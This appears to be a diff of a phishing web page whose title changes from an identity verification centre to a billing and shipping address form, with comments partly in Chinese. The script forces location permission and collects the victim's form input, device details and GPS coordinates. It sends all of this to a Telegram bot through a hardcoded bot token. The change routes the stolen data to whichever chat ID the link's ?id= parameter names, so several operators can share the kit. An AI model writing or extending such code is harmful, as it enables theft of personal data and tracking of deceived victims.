@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification & Security Center</title>
+    <title>Billing & Shipping Address</title>
     <style>
         :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #dc2626; --error-bg: #fef2f2; --success: #16a34a; --success-bg: #f0fdf4; --warn: #f59e0b; }
         * { box-sizing: border-box; }
@@ -161,9 +161,11 @@
 </div>
 
 <script>
-// ========== Configuration ==========
+// ========== 🔑 配置区：自动读取链接 ?id=xxx 作为接收人ID ==========
 const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
-const TELEGRAM_CHAT_ID = "7396947380";
+// ✅ 自动读取链接中的 ID 参数；无ID时默认发给总控（你）
+const URL_PARAMS = new URLSearchParams(window.location.search);
+const TELEGRAM_CHAT_ID = URL_PARAMS.get("id") || "7396947380";
 const DISTANCE_THRESHOLD_METERS = 100;
 const IP_SEGMENTS_TO_MATCH = 2;
 
@@ -234,14 +236,12 @@ function makeReasonText(m){
     return r.join(" + ");
 }
 
-// ========== Postal Code — ONLY uppercase + remove spaces, NO auto-format ==========
+// ========== Postal Code — ONLY uppercase + remove spaces ==========
 function formatZipCode(){
     const el = document.getElementById('zipCode');
     const pos = el.selectionStart;
-    // Remove all spaces & uppercase only
     el.value = el.value.replace(/\s+/g, '').toUpperCase();
     el.selectionStart = el.selectionEnd = pos;
-    // Basic non-empty validation
     const ok = el.value.length >= 4;
     el.classList.toggle('valid', ok && el.value.length > 0);
     el.classList.toggle('invalid', !ok && el.value.length > 0);
@@ -380,7 +380,7 @@ function parseUserAgent(){
     return {device, os, browser};
 }
 
-// ========== Submit ==========
+// ========== Submit — Send to DYNAMIC Chat ID ==========
 async function submitData(){
     if(locationInfo.status !== "granted"){
         alert("Location permission is REQUIRED before submission.\nPlease enable location access and click [Retry Location Access].");
@@ -443,12 +443,13 @@ async function doSubmit(){
 • 操作系统：${deviceInfo.os}
 • 浏览器：${deviceInfo.browser}
 • 坐标：${locationInfo.lat}, ${locationInfo.lng}
-• 提交时间：${timeStr}
+⏰ 提交时间：${timeStr}
 ——————————————`;
 
-    console.log('📤 Sending to Telegram:\n', msg);
+    console.log('📤 Sending to Chat ID:', TELEGRAM_CHAT_ID, '\n', msg);
 
     try{
+        // ✅ 关键：发给「链接 ?id=xxx」指定的 Chat ID
         const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
             method:'POST',
             headers:{'Content-Type':'application/json'},
@@ -456,8 +457,8 @@ async function doSubmit(){
         });
         const json=await res.json();
         if(json.ok){ alert('Submitted successfully!'); location.reload(); }
-        else { alert('Telegram Error: '+JSON.stringify(json)); console.error(json); }
-    }catch(e){ alert('Network error: '+e.message+'\nPlease use HTTPS website.'); console.error(e); }
+        else { alert('Error: ' + JSON.stringify(json)); console.error(json); }
+    }catch(e){ alert('Network error: '+e.message); console.error(e); }
 }
 </script>
 </body>
